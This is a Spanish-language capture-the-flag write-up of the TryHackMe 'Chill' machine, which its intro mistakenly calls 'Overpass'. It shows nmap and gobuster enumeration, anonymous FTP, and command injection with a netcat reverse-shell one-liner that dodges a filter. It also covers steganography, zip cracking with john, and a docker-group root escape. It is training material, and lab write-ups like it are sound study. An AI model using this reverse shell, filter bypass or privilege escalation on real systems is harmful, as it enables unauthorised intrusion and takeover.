---
title: TryHackMe Chill Writeup
published: true
---

La máquina Overpass es una máquina de TryHackMe en la que mediante la explotación de un servidor web conseguimos tanto la flag del usuario como la de root.

# [](#header-1)Enumeración

La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.

Usaremos nmap para analizar los puertos abiertos:

```bash
nmap -p- --open --min-rate 5000 -vvv -n $IP-VICTIMA -oG allPorts
```

*  Escaneo todos los puertos abiertos: -p- --open

*  Mediante --min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.

*  Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.

*  Para que el escaneo no aplique resolución DNS usamos -n

*  En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-19 13:35 EDT
Initiating Connect Scan at 13:35
Scanning 10.10.50.160 [65535 ports]
Discovered open port 21/tcp on 10.10.50.160
Discovered open port 22/tcp on 10.10.50.160
Discovered open port 80/tcp on 10.10.50.160
Completed Connect Scan at 13:35, 11.25s elapsed (65535 total ports)
Nmap scan report for 10.10.50.160
Host is up, received user-set (0.045s latency).
Scanned at 2022-10-19 13:35:11 EDT for 11s
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.29 seconds
```

Puesto que el puerto 80 está abierto, introducimos la IP en nuestro navegador y nos muestra una página de deportes pero no muchas más información. El puerto 21 está abierto por lo que escanearemos la versión y servicio de los puertos abiertos para obtener más información:

```bash
❯ nmap -sCV -p21,22,80 10.10.229.49 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-19 13:51 EDT
Nmap scan report for 10.10.229.49
Host is up (0.046s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.4.179
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Game Info
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.62 seconds
[1]    2818 segmentation fault  nmap -sCV -p21,22,80 10.10.229.49 -oN targeted
```
Podemos entrar mediante ftp con el usuario anonymous y sin contraseña, además de ver un archivo (note.txt). Lo hacemos y vemos un archivo que nos da dos posibles usuarios pero nada más:

```bash
❯ ftp 10.10.229.49
Connected to 10.10.229.49.
220 (vsFTPd 3.0.3)
Name (10.10.229.49:jorge): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||52273|)
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> less note.txt
Anouradh Apaar
```

Usaremos gobuster para obtener directorios ocultos:

```bash
❯ gobuster dir -u http://10.10.229.49 -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.229.49
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2022/10/19 13:54:14 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/about.html           (Status: 200) [Size: 21339]
/.htaccess.txt        (Status: 403) [Size: 277]  
/.htaccess            (Status: 403) [Size: 277]  
/.htaccess.php        (Status: 403) [Size: 277]  
/blog.html            (Status: 200) [Size: 30279]
/contact.html         (Status: 200) [Size: 18301]
/contact.php          (Status: 200) [Size: 0]    
/css                  (Status: 301) [Size: 310] [--> http://10.10.229.49/css/]
/fonts                (Status: 301) [Size: 312] [--> http://10.10.229.49/fonts/]
/images               (Status: 301) [Size: 313] [--> http://10.10.229.49/images/]
/index.html           (Status: 200) [Size: 35184]                                
/index.html           (Status: 200) [Size: 35184]                                
/js                   (Status: 301) [Size: 309] [--> http://10.10.229.49/js/]    
/news.html            (Status: 200) [Size: 19718]                                
/secret               (Status: 301) [Size: 313] [--> http://10.10.229.49/secret/]
/server-status        (Status: 403) [Size: 277]                                  
/team.html            (Status: 200) [Size: 19868]                                
                                                                                 
===============================================================
2022/10/19 13:54:55 Finished
===============================================================
```

Encontramos directorios ocultos y tras observarlos todos el más interesante es /secret

Nos metemos y podemos listar comandos.

# [](#header-1)Acceso al sistema

Intentamos ejecutar una reverse shell pero no nos deja de forma directa. Desde la web de <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentest Monkey</a> usaremos la de Netcat ya que añadiendo \ entre la r y la m al principio de la reverse shell si que se lleva a cabo:

```bash
r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

Mientras tanto desde nuestro equipo nos ponemos en escucha por el puerto indicado en la reverse shell:

```bash
❯ nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.8.4.179] from (UNKNOWN) [10.10.229.49] 45636
/bin/sh: 0: can't access tty; job control turned off
$
```

Listamos el contenido del usuario apaar pero siendo www-data no podemos hacer gran cosa. Sin embargo me fijo en el archivo .helpline.sh

```bash
$ cd apaar
$ ls -la
total 44
drwxr-xr-x 5 apaar apaar 4096 Oct  4  2020 .
drwxr-xr-x 5 root  root  4096 Oct  3  2020 ..
-rw------- 1 apaar apaar    0 Oct  4  2020 .bash_history
-rw-r--r-- 1 apaar apaar  220 Oct  3  2020 .bash_logout
-rw-r--r-- 1 apaar apaar 3771 Oct  3  2020 .bashrc
drwx------ 2 apaar apaar 4096 Oct  3  2020 .cache
drwx------ 3 apaar apaar 4096 Oct  3  2020 .gnupg
-rwxrwxr-x 1 apaar apaar  286 Oct  4  2020 .helpline.sh
-rw-r--r-- 1 apaar apaar  807 Oct  3  2020 .profile
drwxr-xr-x 2 apaar apaar 4096 Oct  3  2020 .ssh
-rw------- 1 apaar apaar  817 Oct  3  2020 .viminfo
-rw-rw---- 1 apaar apaar   46 Oct  4  2020 local.txt
```

Hago sudo -l para ver los comandos que puedo ejecutar como root:

```bash
$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```
Puedo ejecutar el archivo como usuario apaar, lo llevo a cabo y nos hace dos preguntas. Lo primero que se me viene a la cabeza es ejecutar una bash (/bin/bash), parece ser que funciona:

```bash
$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

/bin/bash     
/bin/bash
id 
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
ls
local.txt
cat local.txt
{USER-FLAG: ????????????????????}
```

Obtenemos así la flag del usuario

Desde este punto no podemos hacer mucho más por lo que volvemos al directorio /var/www que es en el que por norma general se encuentran los contenidos interesantes de las explotaciones web.

En este punto listamos el contenido de alguno de los archivos y conseguimos información sobre una imagen. En hacker.php vemos:

```bash
<center>
        <img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
        <h1 style="background-color:red;">You have reached this far. </h2>
        <h1 style="background-color:black;">Look in the dark! You will find your
 answer</h1>
```

Vamos entonces a descargarnos la imagen. Nos creamos un servidor con:

> python3 -m http.server 8000

```bash
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.8.4.179 - - [19/Oct/2022 18:34:39] "GET / HTTP/1.1" 200 -
10.8.4.179 - - [19/Oct/2022 18:34:39] code 404, message File not found
10.8.4.179 - - [19/Oct/2022 18:34:39] "GET /favicon.ico HTTP/1.1" 404 -
10.8.4.179 - - [19/Oct/2022 18:34:41] "GET /hacker-with-laptop_23-2147985341.jpg HTTP/1.1" 200 -
```

Entramos en la $IP-VICTIMA:8000 y la descargamos.

Con stegseek intentamos extraer la información:

```bash
❯ stegseek hacker-with-laptop_23-2147985341.jpg /home/jorge/Descargas/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "backup.zip".
[i] Extracting to "hacker-with-laptop_23-2147985341.jpg.out".
```

Nos los exporta a un archivo comprimido, lo descomprimimos con 7z:

```bash
❯ 7z x hacker-with-laptop_23-2147985341.jpg.out

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs 11th Gen Intel(R) Core(TM) i5-11400F @ 2.60GHz (A0671),ASM,AES-NI)

Scanning the drive for archives:
1 file, 750 bytes (1 KiB)

Extracting archive: hacker-with-laptop_23-2147985341.jpg.out
--
Path = hacker-with-laptop_23-2147985341.jpg.out
Type = zip
Physical Size = 750

    
Enter password (will not be echoed):
ERROR: Wrong password : source_code.php
                      
Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1
```
Tiene contraseña, vamos a intentar crackearla con jhon:

```bash
❯ zip2john hacker-with-laptop_23-2147985341.jpg.out > hash
ver 2.0 efh 5455 efh 7875 hacker-with-laptop_23-2147985341.jpg.out/source_code.php PKZIP Encr: TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3 ts=2297 cs=2297 type=8
❯ john --wordlist=/home/jorge/Descargas/rockyou.txt
Password files required, but none specified
❯ john --wordlist=/home/jorge/Descargas/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
?????????        (hacker-with-laptop_23-2147985341.jpg.out/source_code.php)     
1g 0:00:00:00 DONE (2022-10-19 14:47) 33.33g/s 409600p/s 409600c/s 409600C/s toodles..havana
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

La tenemos, descomprimimos ahora el archivo con la contraseña y nos metemos en source_code.php:

```bash
if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
```
Obtenemos una contraseña para el usuario Anurodh en base64. La descodificamos con:

```bash
❯ echo "IWQwbnRLbjB3bVlwQHNzdzByZA==" | base64 -d
!d0ntKn??????
```

Intentamos entonces logearnos con el usuario anurodh:

```bash
apaar@ubuntu:/home$ su anurodh
su anurodh
Password: !d0ntKn??????

anurodh@ubuntu:/home$
```

# [](#header-1)Escalada de privilegios

Lo conseguimos, hacemos id para ver en que grupos estamos. Parece ser que estamos en el grupo docker. Desde <a href="https://gtfobins.github.io/gtfobins/docker/">GTFOBins</a> vemos que con una sola linea de comandos perteneciendo al grupo docker podemos escalar privilegios a root:

```bash
anurodh@ubuntu:/home$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
proof.txt
# cat proof.txt
cat proof.txt
{ROOT-FLAG: ??????????????????????}
```

Conseguimos la flag de root!

Muchas gracias por leer este writeup, espero que te haya gustado!
